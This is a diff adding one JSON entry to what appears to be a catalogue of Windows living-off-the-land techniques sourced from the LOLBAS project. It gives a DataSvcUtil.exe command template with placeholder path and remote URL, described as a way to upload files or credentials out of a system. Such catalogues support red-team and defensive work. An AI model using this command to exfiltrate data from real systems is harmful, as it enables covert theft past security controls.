@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-datasvcutil-exe-upload",
+  "name": "LOLBAS · DataSvcUtil.exe (Upload)",
+  "command": "DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}",
+  "description": "Upload file, credentials or data exfiltration in general",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "datasvcutil",
+    "upload"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/DataSvcUtil/",
+  "upstream_id": "DataSvcUtil.exe/Upload/0",
+  "category": "lolbas",
+  "subcategory": "upload",
+  "references": [
+    {
+      "title": "LOLBAS — DataSvcUtil.exe",
+      "url": "https://lolbas-project.github.io/lolbas/DataSvcUtil/"
+    }
+  ]
+}
